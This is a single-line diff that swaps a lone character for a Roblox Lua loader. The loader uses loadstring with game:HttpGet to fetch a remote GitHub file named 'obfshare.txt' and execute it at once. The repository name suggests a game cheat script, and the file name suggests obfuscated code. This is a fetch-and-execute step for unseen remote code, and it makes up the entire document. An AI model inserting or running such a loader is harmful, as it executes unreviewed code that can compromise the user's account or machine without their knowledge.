@@ -1,1 +1,1 @@
-s
+loadstring(game:HttpGet("https://raw.githubusercontent.com/HoangAnhKun/Bss/refs/heads/main/obfshare.txt"))()
